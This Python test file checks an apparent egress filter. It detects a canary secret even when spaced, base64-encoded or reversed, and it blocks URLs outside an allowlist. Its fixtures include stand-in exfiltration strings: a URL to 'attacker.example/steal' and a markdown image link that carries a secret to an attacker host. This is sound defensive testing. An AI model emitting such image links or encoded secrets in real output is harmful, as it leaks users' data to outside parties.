import base64

from pif.egress import check_canary_leak, check_urls


def test_plain_secret_is_caught():
    findings = check_canary_leak("the answer is VANTAGE-7731-ORION", ("VANTAGE-7731-ORION",))
    assert len(findings) == 1
    assert findings[0].invariant is True


def test_secret_spaced_and_hyphenated_is_caught():
    findings = check_canary_leak("the value is V-A-N-T-A-G-E-7-7-3-1-O-R-I-O-N", ("VANTAGE-7731-ORION",))
    assert len(findings) == 1


def test_base64_encoded_secret_is_caught():
    encoded = base64.b64encode(b"VANTAGE-7731-ORION").decode()
    findings = check_canary_leak(f"here you go: {encoded}", ("VANTAGE-7731-ORION",))
    assert len(findings) == 1


def test_reversed_secret_is_caught():
    findings = check_canary_leak("NOIRO-1377-EGATNAV", ("VANTAGE-7731-ORION",))
    assert len(findings) == 1


def test_unrelated_output_is_not_flagged():
    findings = check_canary_leak("Your order shipped yesterday.", ("VANTAGE-7731-ORION",))
    assert findings == []


def test_allowlisted_url_passes():
    findings = check_urls("see https://support.vantage-support.example/ticket/1", ("vantage-support.example",))
    assert findings == []


def test_subdomain_of_allowlisted_host_passes():
    findings = check_urls("see https://help.vantage-support.example/x", ("vantage-support.example",))
    assert findings == []


def test_lookalike_domain_is_blocked():
    findings = check_urls("see https://evilvantage-support.example/x", ("vantage-support.example",))
    assert len(findings) == 1


def test_non_allowlisted_url_is_blocked():
    findings = check_urls("see https://attacker.example/steal", ())
    assert len(findings) == 1


def test_markdown_image_exfiltration_is_blocked():
    findings = check_urls("![x](https://attacker.example/?d=secret)", ("vantage-support.example",))
    assert len(findings) == 1
    assert findings[0].rule == "url-not-allowlisted"
